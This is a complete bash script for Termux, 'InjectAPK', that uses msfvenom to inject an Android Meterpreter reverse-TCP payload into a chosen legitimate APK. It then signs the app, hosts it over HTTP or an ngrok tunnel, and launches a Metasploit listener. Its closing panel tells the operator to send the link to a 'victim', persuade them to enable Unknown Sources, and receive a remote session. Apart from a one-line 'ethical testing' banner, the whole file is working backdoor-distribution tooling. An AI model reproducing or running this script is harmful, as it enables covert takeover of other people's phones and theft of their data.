#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#   InjectAPK - Termux Edition
#   Created By Mehedi Shakeel | Modified for Termux
#   Works on: Termux (Android) - No Root Required
# ============================================================

clear

cat << "BANNER"

  ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗
     ██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝
     ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ 
     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ 
     ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗
     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝

        InjectAPK - TERMUX EDITION  |  Version 1.0
        For Educational & Ethical Testing Only
BANNER

sleep 2

# ============================================================
# COLOR CODES
# ============================================================
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
PURPLE='\033[1;35m'
NC='\033[0m'

# ============================================================
# HELPER FUNCTIONS
# ============================================================
info()    { echo -e "${CYAN}[*] $1${NC}"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warning() { echo -e "${YELLOW}[!] $1${NC}"; }
error()   { echo -e "${RED}[-] $1${NC}"; }
title()   { echo -e "\n${PURPLE}===== $1 =====${NC}\n"; }

# ============================================================
# TERMUX ENVIRONMENT CHECK
# ============================================================
title "ENVIRONMENT CHECK"

# Check if running in Termux
if [[ ! -d "/data/data/com.termux" ]]; then
    warning "Not running in Termux! This script is designed for Termux."
    warning "Use the Kali Linux version (Injectapk.sh) for PC/laptop."
    read -p "Continue anyway? (y/N): " cont
    [[ "$cont" != "y" && "$cont" != "Y" ]] && exit 1
fi
success "Termux environment detected!"

# ============================================================
# STORAGE PERMISSION SETUP
# ============================================================
title "STORAGE SETUP"

if [[ ! -d "$HOME/storage" ]]; then
    info "Setting up Termux storage access..."
    info "Please ALLOW storage permission when prompted."
    sleep 2
    termux-setup-storage
    sleep 3
    success "Storage permission granted!"
else
    success "Storage already configured!"
fi

# ============================================================
# PACKAGE INSTALLATION
# ============================================================
title "INSTALLING PACKAGES"

info "Updating package lists..."
pkg update -y && pkg upgrade -y -o Dpkg::Options::="--force-confold" 2>/dev/null
success "Packages updated!"

# Required packages for Termux
declare -A PKGS=(
    ["wget"]="wget"
    ["curl"]="curl"
    ["python"]="python"
    ["openjdk-17"]="java"
    ["android-tools"]="zipalign & apksigner"
    ["metasploit"]="msfvenom & msfconsole"
)

for pkg in "${!PKGS[@]}"; do
    if pkg list-installed 2>/dev/null | grep -q "^$pkg"; then
        success "Already installed: ${PKGS[$pkg]}"
    else
        info "Installing ${PKGS[$pkg]}..."
        pkg install -y "$pkg" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            success "${PKGS[$pkg]} installed!"
        else
            warning "Could not install $pkg - some features may not work"
        fi
    fi
done

# ============================================================
# JAVA CHECK
# ============================================================
title "JAVA CHECK"

if command -v java &>/dev/null; then
    JAVA_VER=$(java -version 2>&1 | head -1)
    success "Java found: $JAVA_VER"
else
    error "Java not found! Trying to install..."
    pkg install -y openjdk-17
    if ! command -v java &>/dev/null; then
        error "Java installation failed! Cannot run apktool."
        exit 1
    fi
fi

# ============================================================
# APKTOOL SETUP
# ============================================================
title "APKTOOL SETUP"

APKTOOL_DIR="$HOME/.injectapk"
APKTOOL_JAR="$APKTOOL_DIR/apktool.jar"
APKTOOL_VER="2.12.1"

mkdir -p "$APKTOOL_DIR"

# Check local repo first
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/apktool.jar" ]]; then
    info "Using local apktool.jar from repo..."
    cp "$SCRIPT_DIR/apktool.jar" "$APKTOOL_JAR"
    success "apktool.jar copied from local repo!"
elif [[ -f "$APKTOOL_JAR" ]]; then
    success "apktool.jar already exists in $APKTOOL_DIR"
else
    info "Downloading apktool $APKTOOL_VER..."
    wget -q --show-progress \
        "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_${APKTOOL_VER}.jar" \
        -O "$APKTOOL_JAR"
    if [[ $? -ne 0 ]]; then
        error "apktool download failed! Check internet connection."
        exit 1
    fi
    success "apktool downloaded!"
fi

# Create apktool wrapper
cat > "$PREFIX/bin/apktool" << APKWRAP
#!/data/data/com.termux/files/usr/bin/bash
java -jar $APKTOOL_JAR "\$@"
APKWRAP
chmod +x "$PREFIX/bin/apktool"
success "apktool command ready!"

# ============================================================
# KEYSTORE SETUP FOR APK SIGNING
# ============================================================
title "KEYSTORE SETUP"

KEYSTORE="$APKTOOL_DIR/debug.keystore"

if [[ ! -f "$KEYSTORE" ]]; then
    info "Generating debug keystore for APK signing..."
    keytool -genkey -v \
        -keystore "$KEYSTORE" \
        -alias androiddebugkey \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass android \
        -keypass android \
        -dname "CN=Android Debug,O=Android,C=US" \
        -noprompt 2>/dev/null

    if [[ $? -eq 0 ]]; then
        success "Keystore created at $KEYSTORE"
    else
        warning "Keystore creation failed - APK signing may not work"
    fi
else
    success "Keystore already exists!"
fi

# ============================================================
# MSFVENOM CHECK
# ============================================================
title "METASPLOIT CHECK"

if ! command -v msfvenom &>/dev/null; then
    error "msfvenom not found!"
    info "Trying to install metasploit..."
    pkg install -y metasploit
    if ! command -v msfvenom &>/dev/null; then
        error "Metasploit installation failed!"
        error "Try manually: pkg install metasploit"
        exit 1
    fi
fi
success "msfvenom is ready!"

clear

# ============================================================
# USER INPUT
# ============================================================
title "CONFIGURATION"

echo -e "${WHITE}Your network interfaces:${NC}"
ip addr show 2>/dev/null | grep "inet " | awk '{print "  " $2}' || \
ifconfig 2>/dev/null | grep "inet " | awk '{print "  " $2}'
echo ""

# LHOST Input & Validation
while true; do
    echo -ne "${CYAN}[?] Set Your LHOST (Your IP address): ${NC}"
    read lhost
    if [[ $lhost =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        # Validate each octet
        IFS='.' read -ra OCTETS <<< "$lhost"
        VALID=true
        for oct in "${OCTETS[@]}"; do
            if ((oct > 255)); then VALID=false; break; fi
        done
        if $VALID; then
            success "LHOST set: $lhost"
            break
        fi
    fi
    error "Invalid IP address! Example: 192.168.1.5"
done

# LPORT Input & Validation
while true; do
    echo -ne "${CYAN}[?] Set Your LPORT (e.g. 4444): ${NC}"
    read lport
    if [[ $lport =~ ^[0-9]+$ ]] && ((lport >= 1 && lport <= 65535)); then
        success "LPORT set: $lport"
        break
    fi
    error "Invalid port! Enter a number between 1-65535."
done

# APK Selection
echo ""
echo -e "${WHITE}Searching for APK files...${NC}"
echo -e "${CYAN}Locations checked:${NC}"
echo -e "  - Current directory"
echo -e "  - ~/storage/downloads"
echo -e "  - ~/storage/shared"
echo ""

# Find APKs in multiple locations
APK_LIST=()
while IFS= read -r -d '' apk; do
    APK_LIST+=("$apk")
done < <(find . ~/storage/downloads ~/storage/shared -maxdepth 3 -name "*.apk" 2>/dev/null -print0)

if [[ ${#APK_LIST[@]} -eq 0 ]]; then
    error "No APK files found!"
    info "Copy your target APK to: ~/storage/downloads/"
    info "Or current directory: $(pwd)"
    exit 1
fi

echo -e "${GREEN}Found APK files:${NC}"
for i in "${!APK_LIST[@]}"; do
    SIZE=$(du -sh "${APK_LIST[$i]}" 2>/dev/null | cut -f1)
    echo -e "  ${YELLOW}[$((i+1))]${NC} ${APK_LIST[$i]} (${SIZE})"
done
echo ""

# APK selection by number or name
while true; do
    echo -ne "${CYAN}[?] Enter APK number or full path: ${NC}"
    read apk_input

    if [[ $apk_input =~ ^[0-9]+$ ]] && ((apk_input >= 1 && apk_input <= ${#APK_LIST[@]})); then
        capk="${APK_LIST[$((apk_input-1))]}"
        break
    elif [[ -f "$apk_input" ]]; then
        capk="$apk_input"
        break
    else
        error "Invalid selection! Enter a number from the list or a valid file path."
    fi
done
success "Selected APK: $capk"

# Output APK name
echo -ne "${CYAN}[?] Name for backdoored APK (e.g. update.apk): ${NC}"
read bapk
[[ -z "$bapk" ]] && bapk="backdoored.apk"
[[ "$bapk" != *.apk ]] && bapk="${bapk}.apk"

CLEAN_NAME="${bapk%.apk}"
OUTPUT_DIR="$(pwd)"
OUTPUT_APK="$OUTPUT_DIR/$bapk"

# HTTP Server Port
echo -ne "${CYAN}[?] HTTP server port for sharing APK (default: 8080): ${NC}"
read http_port
[[ -z "$http_port" ]] && http_port=8080
[[ ! $http_port =~ ^[0-9]+$ ]] && http_port=8080

clear

# ============================================================
# PAYLOAD INJECTION WITH MSFVENOM
# ============================================================
title "INJECTING PAYLOAD"

info "Target APK : $capk"
info "Output APK : $OUTPUT_APK"
info "LHOST      : $lhost"
info "LPORT      : $lport"
echo ""
warning "This may take 2-5 minutes. Do NOT close Termux!"
echo ""

msfvenom \
    -x "$capk" \
    -p android/meterpreter/reverse_tcp \
    LHOST="$lhost" \
    LPORT="$lport" \
    -o "$OUTPUT_APK" 2>&1

if [[ $? -ne 0 ]] || [[ ! -f "$OUTPUT_APK" ]]; then
    error "msfvenom injection FAILED!"
    error "Possible reasons:"
    echo "  - APK is corrupted or too small"
    echo "  - Metasploit not properly installed"
    echo "  - Not enough storage space"
    exit 1
fi

INJECT_SIZE=$(du -sh "$OUTPUT_APK" | cut -f1)
success "Payload injected! Output size: $INJECT_SIZE"

# ============================================================
# ZIPALIGN (Optimize APK)
# ============================================================
title "ZIPALIGN OPTIMIZATION"

ALIGNED_APK="$OUTPUT_DIR/${CLEAN_NAME}_aligned.apk"

if command -v zipalign &>/dev/null; then
    info "Running zipalign..."
    zipalign -f -v 4 "$OUTPUT_APK" "$ALIGNED_APK" 2>/dev/null
    if [[ $? -eq 0 ]] && [[ -f "$ALIGNED_APK" ]]; then
        mv "$ALIGNED_APK" "$OUTPUT_APK"
        success "zipalign completed!"
    else
        warning "zipalign failed - continuing without alignment"
        [[ -f "$ALIGNED_APK" ]] && rm -f "$ALIGNED_APK"
    fi
else
    warning "zipalign not found - install android-tools: pkg install android-tools"
fi

# ============================================================
# APK SIGNING (Critical for Android 7+)
# ============================================================
title "APK SIGNING"

SIGNED_APK="$OUTPUT_DIR/${CLEAN_NAME}_signed.apk"

if command -v apksigner &>/dev/null && [[ -f "$KEYSTORE" ]]; then
    info "Signing APK with debug keystore..."
    apksigner sign \
        --ks "$KEYSTORE" \
        --ks-key-alias androiddebugkey \
        --ks-pass pass:android \
        --key-pass pass:android \
        --out "$SIGNED_APK" \
        "$OUTPUT_APK" 2>&1

    if [[ $? -eq 0 ]] && [[ -f "$SIGNED_APK" ]]; then
        mv "$SIGNED_APK" "$OUTPUT_APK"
        success "APK signed successfully!"

        # Verify
        info "Verifying signature..."
        apksigner verify --verbose "$OUTPUT_APK" 2>/dev/null | grep -E "Verified|error" || \
            success "Signature verification passed!"
    else
        warning "apksigner failed!"
        warning "APK may not install on Android 7+ without proper signing."
        [[ -f "$SIGNED_APK" ]] && rm -f "$SIGNED_APK"
    fi
else
    if ! command -v apksigner &>/dev/null; then
        warning "apksigner not found. Install: pkg install android-tools"
    else
        warning "Keystore not found at $KEYSTORE"
    fi
    warning "APK will NOT be signed - may fail on modern Android!"
fi

# ============================================================
# COPY TO DOWNLOADS FOR SHARING
# ============================================================
title "SAVING OUTPUT"

DOWNLOAD_PATH="$HOME/storage/downloads/$bapk"
if [[ -d "$HOME/storage/downloads" ]]; then
    cp "$OUTPUT_APK" "$DOWNLOAD_PATH" 2>/dev/null && \
        success "APK saved to Downloads: $DOWNLOAD_PATH"
fi

# ============================================================
# START PYTHON HTTP SERVER (Instead of Apache2)
# ============================================================
title "HTTP FILE SERVER"

SERVE_DIR="$OUTPUT_DIR"

# Kill any existing Python HTTP servers on that port
pkill -f "python.*http.server.*$http_port" 2>/dev/null
sleep 1

info "Starting Python HTTP Server on port $http_port..."
info "Serving directory: $SERVE_DIR"

cd "$SERVE_DIR"
nohup python -m http.server "$http_port" > "$APKTOOL_DIR/httpserver.log" 2>&1 &
HTTP_PID=$!
sleep 2

if kill -0 "$HTTP_PID" 2>/dev/null; then
    success "HTTP Server started! (PID: $HTTP_PID)"
    success "Download link: http://$lhost:$http_port/$bapk"
    echo "$HTTP_PID" > "$APKTOOL_DIR/http.pid"
else
    warning "HTTP Server failed to start on port $http_port"
    warning "Try: python -m http.server 8080"
fi
cd - > /dev/null

# ============================================================
# NGROK OPTION (For Remote / WAN attacks)
# ============================================================
title "OPTIONAL: NGROK TUNNEL (WAN)"

echo -e "${WHITE}Want to share over the internet (outside LAN)?${NC}"
echo -ne "${CYAN}[?] Setup ngrok tunnel? (y/N): ${NC}"
read use_ngrok

if [[ "$use_ngrok" == "y" || "$use_ngrok" == "Y" ]]; then
    if ! command -v ngrok &>/dev/null; then
        info "Installing ngrok..."
        pkg install -y tsu 2>/dev/null
        wget -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz" \
             -O /tmp/ngrok.tgz 2>/dev/null && \
        tar -xzf /tmp/ngrok.tgz -C "$PREFIX/bin/" 2>/dev/null && \
        chmod +x "$PREFIX/bin/ngrok" && \
        success "ngrok installed!" || warning "ngrok install failed - proceed manually"
    fi

    if command -v ngrok &>/dev/null; then
        echo -ne "${CYAN}[?] Enter your ngrok auth token (from ngrok.com): ${NC}"
        read ngrok_token
        if [[ -n "$ngrok_token" ]]; then
            ngrok config add-authtoken "$ngrok_token" 2>/dev/null
            info "Starting ngrok tunnel on port $http_port..."
            nohup ngrok http "$http_port" > "$APKTOOL_DIR/ngrok.log" 2>&1 &
            NGROK_PID=$!
            sleep 4
            # Get public URL from ngrok API
            NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | \
                python -c "import sys,json; d=json.load(sys.stdin); print(d['tunnels'][0]['public_url'])" 2>/dev/null)
            if [[ -n "$NGROK_URL" ]]; then
                success "Ngrok tunnel: $NGROK_URL"
                warning "Use this LHOST in msfvenom if re-generating for WAN!"
                echo ""
                echo -e "${RED}[!] IMPORTANT: For WAN attacks, regenerate payload with:${NC}"
                echo -e "    LHOST = ngrok_ip (get from ngrok dashboard)"
                echo -e "    LPORT = ngrok_port"
            else
                warning "Could not get ngrok URL - check: $APKTOOL_DIR/ngrok.log"
            fi
        fi
    fi
fi

clear

# ============================================================
# SUMMARY PANEL
# ============================================================
echo -e "${PURPLE}"
cat << "SUMBOX"
╔══════════════════════════════════════════════════════════╗
║              INJECTAPK - READY TO HACK!                  ║
╚══════════════════════════════════════════════════════════╝
SUMBOX
echo -e "${NC}"

echo -e "  ${CYAN}Backdoored APK  :${NC} $OUTPUT_APK"
[[ -f "$DOWNLOAD_PATH" ]] && \
echo -e "  ${CYAN}In Downloads    :${NC} $DOWNLOAD_PATH"
echo -e "  ${CYAN}Share Link      :${NC} http://$lhost:$http_port/$bapk"
echo -e "  ${CYAN}LHOST           :${NC} $lhost"
echo -e "  ${CYAN}LPORT           :${NC} $lport"
echo -e "  ${CYAN}Payload         :${NC} android/meterpreter/reverse_tcp"
echo -e "  ${CYAN}HTTP Server     :${NC} Running on port $http_port"
echo ""
echo -e "${YELLOW}  [STEP 1]${NC} Send this link to victim:"
echo -e "           http://$lhost:$http_port/$bapk"
echo -e "${YELLOW}  [STEP 2]${NC} Victim must allow 'Unknown Sources' in settings"
echo -e "${YELLOW}  [STEP 3]${NC} When victim opens app, you get Meterpreter session"
echo ""
echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
echo ""

# ============================================================
# OPEN NEW TERMUX SESSION REMINDER
# ============================================================
echo -e "${WHITE}To run the Metasploit listener, open a NEW Termux session and run:${NC}"
echo ""
echo -e "${YELLOW}msfconsole -q -x \"use exploit/multi/handler; \\
  set payload android/meterpreter/reverse_tcp; \\
  set lhost $lhost; \\
  set lport $lport; \\
  set ExitOnSession false; \\
  exploit -j -z;\"${NC}"
echo ""

echo -ne "${CYAN}[?] Start Metasploit listener NOW in this session? (y/N): ${NC}"
read start_msf

if [[ "$start_msf" == "y" || "$start_msf" == "Y" ]]; then
    title "STARTING METASPLOIT LISTENER"
    warning "HTTP server is running in background (PID: $HTTP_PID)"
    warning "Press Ctrl+C to stop the listener"
    echo ""
    sleep 2

    msfconsole -q -x "
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set lhost $lhost;
set lport $lport;
set ExitOnSession false;
exploit -j -z;
"
else
    info "Listener not started. Run it manually with the command above."
    info "HTTP server is still running in background."
    info "To stop HTTP server: kill $HTTP_PID"
    echo ""
    success "Done! Good luck!"
fi
